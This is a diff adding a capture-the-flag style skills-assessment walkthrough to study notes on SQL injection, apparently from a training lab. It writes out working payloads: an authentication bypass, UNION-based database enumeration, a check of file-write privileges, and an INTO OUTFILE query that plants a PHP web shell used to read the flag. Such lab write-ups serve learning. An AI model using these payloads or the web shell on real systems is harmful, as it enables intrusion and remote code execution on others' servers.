@@ -334,3 +334,27 @@ First we can make sure that any and all input is sanatized. We can also make sur
 # Closing it Out
 
 ## Skills Assessment
+
+The skills assessment here is:
+Assess the web application and use a variety of techniques to gain remote code execution and find a flag in the / root directory of the file system. Submit the contents of the flag as your answer. 
+
+To do this, the first thing I did was run this on the login page:
+`admin' or 1=1 -- `
+
+This gets us to a page with a search bar and when you run this `' Union select 1,2,3,4, 5 -- -`you find that there are 5 columns in the current DB and columns 2,3,4,5 are displayed.
+
+So then I ran `' Union select 1,user(),3,4, 5 -- -` and found we are root@localhost`
+
+So then I ran `' UNION select 1,schema_name,3,4,5 from INFORMATION_SCHEMA.SCHEMATA-- -` and got the names of the other databases.
+
+Then I ran `' Union select 1,Database(),3,4, 5 -- -` and found we are on ilfreight.
+
+Then I checked if we had file priviliges, we do. So I checked if we have write priviliges with:
+`' UNION SELECT 1, variable_name, variable_value, 4, 5 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -`
+
+And the result is null, so we do. So I tried to run: `' union select "",'<?php system($_REQUEST[0]); ?>', "", "", "" into outfile '/var/www/html/shell.php'-- -` but I get permission denied.
+
+So we notice that the url is actually dashboard/dashboard.php, so I tried `' union select "",'<?php system($_REQUEST[0]); ?>', "", "", "" into outfile '/var/www/html/dashboard/shell.php'-- -` and that worked.
+
+Then I just ran ls on the current directory, and then ls .., and then ls ../../..... Until I found the root directory. Then I did, `http://94.237.56.188:46254/dashboard/shell.php?0=cat%20../../../../../flag_cae1dadcd174.txt` and got the answer.
+
